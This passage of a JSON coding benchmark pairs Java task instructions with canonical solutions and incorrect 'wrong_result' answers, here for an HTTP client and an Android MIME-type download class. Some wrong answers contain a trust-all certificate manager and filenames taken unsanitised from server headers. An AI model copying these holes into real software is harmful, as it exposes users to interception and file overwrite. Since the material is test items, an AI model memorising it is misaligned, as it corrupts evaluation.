config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else if (!cookie.contains(config.getRememberMeCookieName() + \"=\")) {\n            headers.put(\"Cookie\", cookie + \"; \" + config.getRememberMeCookieName() + \"=\" + cookieValue);\n        } else {\n            int start = cookie.indexOf(config.getRememberMeCookieName()) + config.getRememberMeCookieName().length() + 1;\n            int end = cookie.indexOf(\";\", start);\n            end = end == -1 ? cookie.length() : end;\n            headers.put(\"Cookie\", cookie.substring(0, start) + cookieValue + cookie.substring(end));\n        }\n    }\n\n    private static void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        String requestBody = httpRequestInfo.getRequestBody();\n        if (requestBody != null && !requestBody.trim().equals(\"\")) {\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            PrintWriter printWriter = new PrintWriter(connection.getOutputStream());\n            printWriter.write(requestBody);\n            printWriter.flush();\n        }\n    }\n\n    private static void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        try {\n            if (connection != null) connection.disconnect();\n            if (inputStream != null) inputStream.close();\n            if (baos != null) baos.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class Config {\n    private static Config instance;\n    private String proxyHost;\n    private int proxyPort;\n    private String cookieName;\n    private boolean sslVerificationEnabled;\n\n    private Config() {\n        this.proxyHost = \"\";\n        this.proxyPort = 0;\n        this.cookieName = \"JSESSIONID\";\n        this.sslVerificationEnabled = true;\n    }\n\n    public static Config getInstance() {\n        if (instance == null) {\n            instance = new Config();\n        }\n        return instance;\n    }\n\n    public String getProxyHost() {\n        return proxyHost;\n    }\n\n    public void setProxyHost(String proxyHost) {\n        this.proxyHost = proxyHost;\n    }\n\n    public int getProxyPort() {\n        return proxyPort;\n    }\n\n    public void setProxyPort(int proxyPort) {\n        this.proxyPort = proxyPort;\n    }\n\n    public String getCookieName() {\n        return cookieName;\n    }\n\n    public void setCookieName(String cookieName) {\n        this.cookieName = cookieName;\n    }\n\n    public boolean isSslVerificationEnabled() {\n        return sslVerificationEnabled;\n    }\n\n    public void setSslVerificationEnabled(boolean sslVerificationEnabled) {\n        this.sslVerificationEnabled = sslVerificationEnabled;\n    }\n}\n\npublic class HttpRequestInfo {\n    private String url;\n    private String method;\n    private Map<String, String> headers;\n    private String body;\n    private boolean useHttps;\n\n    public HttpRequestInfo(String url, String method, Map<String, String> headers, String body, boolean useHttps) {\n        this.url = url;\n        this.method = method;\n        this.headers = headers;\n        this.body = body;\n        this.useHttps = useHttps;\n    }\n\n    public String getUrl() {\n        return url;\n    }\n\n    public String getMethod() {\n        return method;\n    }\n\n    public Map<String, String> getHeaders() {\n        return headers;\n    }\n\n    public String getBody() {\n        return body;\n    }\n\n    public boolean isUseHttps() {\n        return useHttps;\n    }\n}\n\npublic class HttpClient {\n    private static final Config config = Config.getInstance();\n\n    public String sendRequest(HttpRequestInfo httpRequestInfo, String cookieValue) {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            connection = createConnection(httpRequestInfo);\n            configureRequest(connection, httpRequestInfo, cookieValue);\n            sendRequestBody(connection, httpRequestInfo);\n            int responseCode = connection.getResponseCode();\n            if (responseCode == HttpURLConnection.HTTP_OK) {\n                inputStream = connection.getInputStream();\n                baos = new ByteArrayOutputStream();\n                byte[] buffer = new byte[1024];\n                int length;\n                while ((length = inputStream.read(buffer)) != -1) {\n                    baos.write(buffer, 0, length);\n                }\n                return baos.toString(\"UTF-8\");\n            } else {\n                return null;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n            return null;\n        } finally {\n            closeResources(connection, inputStream, baos);\n        }\n    }\n\n    private HttpURLConnection createConnection(HttpRequestInfo httpRequestInfo) throws IOException {\n        URL url = new URL(httpRequestInfo.getUrl());\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        if (config.getProxyHost() != null && !config.getProxyHost().isEmpty()) {\n            Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(config.getProxyHost(), config.getProxyPort()));\n            connection.setProxy(proxy);\n        }\n        connection.setConnectTimeout(5000);\n        connection.setReadTimeout(5000);\n        if (httpRequestInfo.isUseHttps()) {\n            if (!config.isSslVerificationEnabled()) {\n                SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                sslContext.init(null, new TrustManager[]{new TrustAllManager()}, new SecureRandom());\n                connection.setSSLSocketFactory(sslContext.getSocketFactory());\n            }\n        }\n        return connection;\n    }\n\n    private void configureRequest(HttpURLConnection connection, HttpRequestInfo httpRequestInfo, String cookieValue) {\n        connection.setRequestMethod(httpRequestInfo.getMethod());\n        Map<String, String> headers = httpRequestInfo.getHeaders();\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                connection.setRequestProperty(entry.getKey(), entry.getValue());\n            }\n        }\n        configureCookie(headers, cookieValue);\n    }\n\n    private void configureCookie(Map<String, String> headers, String cookieValue) {\n        if (cookieValue != null && !cookieValue.isEmpty()) {\n            headers.put(config.getCookieName(), cookieValue);\n        }\n    }\n\n    private void sendRequestBody(HttpURLConnection connection, HttpRequestInfo httpRequestInfo) throws IOException {\n        if (httpRequestInfo.getBody() != null && !httpRequestInfo.getBody().isEmpty()) {\n            connection.setDoOutput(true);\n            try (OutputStream os = connection.getOutputStream()) {\n                byte[] input = httpRequestInfo.getBody().getBytes(\"UTF-8\");\n                os.write(input, 0, input.length);\n            }\n        }\n    }\n\n    private void closeResources(HttpURLConnection connection, InputStream inputStream, ByteArrayOutputStream baos) {\n        if (connection != null) {\n            connection.disconnect();\n        }\n        if (inputStream != null) {\n            try {\n                inputStream.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        if (baos != null) {\n            try {\n                baos.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static class TrustAllManager implements TrustManager, X509TrustManager {\n        public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n        public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n    }\n}"
  },
  {
    "Task_id": 99,
    "Instruction": "Task Description: Create a class that handles fetching MIME types from URLs and managing download requests using Android's DownloadManager.\n\nClass Description: The FetchUrlMimeType class is responsible for determining the MIME type of a resource at a given URL, setting up a download request with appropriate parameters, and enqueuing the download using Android's DownloadManager. It handles HTTP connections, processes response headers, and manages file naming and destination.\n\nAttributes:\n- mRequest: [DownloadManager.Request] - The download request to be configured and enqueued\n- mDownloadManager: [DownloadManager] - The Android DownloadManager instance used to enqueue downloads\n- mUri: [String] - The URL of the resource to be downloaded\n- mCookies: [String] - Optional cookies to be included in the HTTP request\n- mUserAgent: [String] - The user agent string to be used in the HTTP request\n\nMethods:\n- Constructor: [FetchUrlMimeType](DownloadManager downloadManager, DownloadManager.Request request, String uri, String cookies, String userAgent) -> [void] - Initializes the class with download manager, request, URI, cookies, and user agent\n- create: [create]() -> [Single<Result>] - Creates and executes the download process, returning a Single observable with the result status. This method:\n  1. Establishes an HTTP connection to the URL\n  2. Extracts MIME type and content disposition from headers\n  3. Configures the download request with proper MIME type and filename\n  4. Enqueues the download request\n  5. Returns success/failure status through the observable\n\nNested Enum:\n- Result: [enum] - Represents possible outcomes of the download enqueue operation:\n  - FAILURE_ENQUEUE: Failed to enqueue the download request\n  - FAILURE_LOCATION: Failed due to storage location issues\n  - SUCCESS: Download successfully enqueued",
    "Canonical_solution": "import android.app.DownloadManager;\nimport android.os.Environment;\nimport android.util.Log;\nimport android.webkit.MimeTypeMap;\nimport android.webkit.URLUtil;\n\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport acr.browser.lightning.utils.Utils;\nimport androidx.annotation.NonNull;\nimport io.reactivex.rxjava3.core.Single;\n\nclass FetchUrlMimeType {\n\n    private static final String TAG = \"FetchUrlMimeType\";\n\n    private final DownloadManager.Request mRequest;\n    private final DownloadManager mDownloadManager;\n    private final String mUri;\n    private final String mCookies;\n    private final String mUserAgent;\n\n    public FetchUrlMimeType(DownloadManager downloadManager,\n                            DownloadManager.Request request,\n                            String uri,\n                            String cookies,\n                            String userAgent) {\n        mRequest = request;\n        mDownloadManager = downloadManager;\n        mUri = uri;\n        mCookies = cookies;\n        mUserAgent = userAgent;\n    }\n\n    public Single<Result> create() {\n        return Single.create(emitter -> {\n            String mimeType = null;\n            String contentDisposition = null;\n            HttpURLConnection connection = null;\n            try {\n                URL url = new URL(mUri);\n                connection = (HttpURLConnection) url.openConnection();\n                if (mCookies != null && !mCookies.isEmpty()) {\n                    connection.addRequestProperty(\"Cookie\", mCookies);\n                    connection.setRequestProperty(\"User-Agent\", mUserAgent);\n                }\n                connection.connect();\n                if (connection.getResponseCode() == 200) {\n                    String header = connection.getHeaderField(\"Content-Type\");\n                    if (header != null) {\n                        mimeType = header;\n                        final int semicolonIndex = mimeType.indexOf(';');\n                        if (semicolonIndex != -1) {\n                            mimeType = mimeType.substring(0, semicolonIndex);\n                        }\n                    }\n                    String contentDispositionHeader = connection.getHeaderField(\"Content-Disposition\");\n                    if (contentDispositionHeader != null) {\n                        contentDisposition = contentDispositionHeader;\n                    }\n                }\n            } catch (@NonNull IllegalArgumentException | IOException ex) {\n                if (connection != null)\n                    connection.disconnect();\n            } finally {\n                if (connection != null)\n                    connection.disconnect();\n            }\n\n            if (mimeType != null) {\n                if (mimeType.equalsIgnoreCase(\"text/plain\")\n                    || mimeType.equalsIgnoreCase(\"application/octet-stream\")) {\n                    String newMimeType = MimeTypeMap.getSingleton().getMimeTypeFromExtension(\n                        Utils.guessFileExtension(mUri));\n                    if (newMimeType != null) {\n                        mRequest.setMimeType(newMimeType);\n                    }\n                }\n                final String filename = URLUtil.guessFileName(mUri, contentDisposition, mimeType);\n                mRequest.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);\n            }\n\n            try {\n                mDownloadManager.enqueue(mRequest);\n                emitter.onSuccess(Result.SUCCESS);\n            } catch (IllegalArgumentException e) {\n                Log.e(TAG, \"Unable to enqueue request\", e);\n                emitter.onSuccess(Result.FAILURE_ENQUEUE);\n            } catch (SecurityException e) {\n                emitter.onSuccess(Result.FAILURE_LOCATION);\n            }\n        });\n    }\n\n    enum Result {\n        FAILURE_ENQUEUE,\n        FAILURE_LOCATION,\n        SUCCESS\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import android.app.DownloadManager;\nimport android.content.Context;\nimport android.net.Uri;\nimport android.os.Environment;\nimport io.reactivex.Single;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class FetchUrlMimeType {\n    private DownloadManager mDownloadManager;\n    private DownloadManager.Request mRequest;\n    private String mUri;\n    private String mCookies;\n    private String mUserAgent;\n\n    public FetchUrlMimeType(DownloadManager downloadManager, DownloadManager.Request request, String uri, String cookies, String userAgent) {\n        mDownloadManager = downloadManager;\n        mRequest = request;\n        mUri = uri;\n        mCookies = cookies;\n        mUserAgent = userAgent;\n    }\n\n    public Single<Result> create() {\n        return Single.create(emitter -> {\n            try {\n                URL url = new URL(mUri);\n                HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                connection.setRequestMethod(\"HEAD\");\n                connection.setConnectTimeout(5000);\n                connection.setReadTimeout(5000);\n                connection.setRequestProperty(\"User-Agent\", mUserAgent);\n                if (mCookies != null) {\n                    connection.setRequestProperty(\"Cookie\", mCookies);\n                }\n\n                int responseCode = connection.getResponseCode();\n                if (responseCode != HttpURLConnection.HTTP_OK) {\n                    emitter.onError(new IOException(\"HTTP request failed with code: \" + responseCode));\n                    return;\n                }\n\n                String mimeType = connection.getContentType();\n                String contentDisposition = connection.getHeaderField(\"Content-Disposition\");\n\n                String filename = \"download\";\n                if (contentDisposition != null && contentDisposition.contains(\"filename=\")) {\n                    int start = contentDisposition.indexOf(\"filename=\") + \"filename=\".length();\n                    int end = contentDisposition.indexOf(\"\\\"\", start);\n                    if (end == -1) {\n                        end = contentDisposition.length();\n                    }\n                    filename = contentDisposition.substring(start, end);\n                } else {\n                    int lastSlashIndex = mUri.lastIndexOf('/');\n                    if (lastSlashIndex != -1) {\n                        filename = mUri.substring(lastSlashIndex + 1);\n                    }\n                }\n\n                mRequest.setMimeType(mimeType);\n                mRequest.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);\n                mRequest.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);\n\n                long downloadId = mDownloadManager.enqueue(mRequest);\n                if (downloadId == -1) {\n                    emitter.onError(new IOException(\"Failed to enqueue download\"));\n                    return;\n                }\n\n                emitter.onSuccess(Result.SUCCESS);\n            } catch (Exception e) {\n                emitter.onError(e);\n            }\n        });\n    }\n\n    public enum Result {\n        FAILURE_ENQUEUE, FAILURE_LOCATION, SUCCESS\n    }\n}"
  }
]